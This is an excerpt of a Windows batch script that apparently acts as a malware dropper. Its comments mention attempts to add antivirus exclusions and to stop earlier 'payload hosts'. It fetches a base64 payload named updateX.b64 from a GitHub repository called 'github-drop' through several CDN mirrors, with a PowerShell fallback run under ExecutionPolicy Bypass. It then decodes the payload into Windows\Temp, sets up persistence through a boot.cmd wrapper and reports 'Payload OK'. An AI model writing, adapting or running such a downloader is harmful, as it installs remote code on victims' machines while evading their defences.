...
REM Best-effort exclusions (may print Access denied on locked AV - ignore)
...
REM Stop prior payload hosts that lock wucache_pkg.ps1
...
call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateX.b64" && goto :have_payload
call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateX.b64" && goto :have_payload
call :try_curl "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateX.b64" && goto :have_payload
call :try_curl "https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateX.b64" && goto :have_payload

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateX.b64','%B64%')}catch{exit 1}"
...
REM Prefer PowerShell decode to Windows\Temp (certutil often Access Denied on .ps1 in ProgramData)
...
REM Best-effort mirror into workdir for persistence paths
...
REM If boot.cmd cannot be written under workdir, write under Windows\Temp
if not exist "%WRAP%" (
...
echo Payload OK [%MARKER%], launched from %RUNPS%. Wait 180s.
exit /b 0
